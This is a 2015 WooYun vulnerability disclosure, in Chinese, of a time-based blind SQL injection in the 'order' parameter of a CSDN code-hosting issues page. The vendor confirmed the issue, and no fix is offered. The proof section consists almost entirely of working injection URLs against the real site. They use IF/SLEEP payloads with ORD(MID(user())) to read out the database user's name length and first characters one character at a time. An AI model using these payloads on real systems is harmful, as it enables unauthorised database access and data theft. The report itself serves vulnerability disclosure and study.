wybug_detail: 漏洞详情 披露状态：   									2015-07-13：	细节已通知厂商并且等待厂商处理中									2015-07-13：	厂商已经确认，细节仅向厂商公开									2015-07-23：	细节向核心白帽子及相关领域专家公开									2015-08-02：	细节向普通白帽子公开									2015-08-12：	细节向实习白帽子公开									2015-08-27：	细节向公众公开  简要描述： CSDN某频道SQL注入 详细说明：  URL：https://code.csdn.net/dwzteam/dwz_springmvc/issues?closed=0&order=注入点：order   漏洞证明：  延时：https://code.csdn.net/dwzteam/dwz_springmvc/issues?closed=0&order=AND if(now()=sysdate() and 1=1,SLEEP(3),0)不延时：https://code.csdn.net/dwzteam/dwz_springmvc/issues?closed=0&order=AND if(now()=sysdate() and 1=2,SLEEP(3),0)手工注入user（）长度为16https://code.csdn.net/dwzteam/dwz_springmvc/issues?closed=0&order=AND if((ORD(MID((length(user())),1,1))=49 and sleep(3)),1,(select 1 union select 2))https://code.csdn.net/dwzteam/dwz_springmvc/issues?closed=0&order=AND if((ORD(MID((length(user())),2,1))=54 and sleep(3)),1,(select 1 union select 2))手工注入user（）前五位   10.20https://code.csdn.net/dwzteam/dwz_springmvc/issues?closed=0&order=AND if((ORD(MID((user()),1,1))=49 and sleep(3)),1,(select 1 union select 2))https://code.csdn.net/dwzteam/dwz_springmvc/issues?closed=0&order=AND if((ORD(MID((user()),2,1))=48 and sleep(3)),1,(select 1 union select 2))https://code.csdn.net/dwzteam/dwz_springmvc/issues?closed=0&order=AND if((ORD(MID((user()),3,1))=46 and sleep(3)),1,(select 1 union select 2))https://code.csdn.net/dwzteam/dwz_springmvc/issues?closed=0&order=AND if((ORD(MID((user()),4,1))=50 and sleep(3)),1,(select 1 union select 2))https://code.csdn.net/dwzteam/dwz_springmvc/issues?closed=0&order=AND if((ORD(MID((user()),5,1))=48 and sleep(3)),1,(select 1 union select 2))   修复方案：  不会   版权声明：转载请注明来源 路人甲@乌云
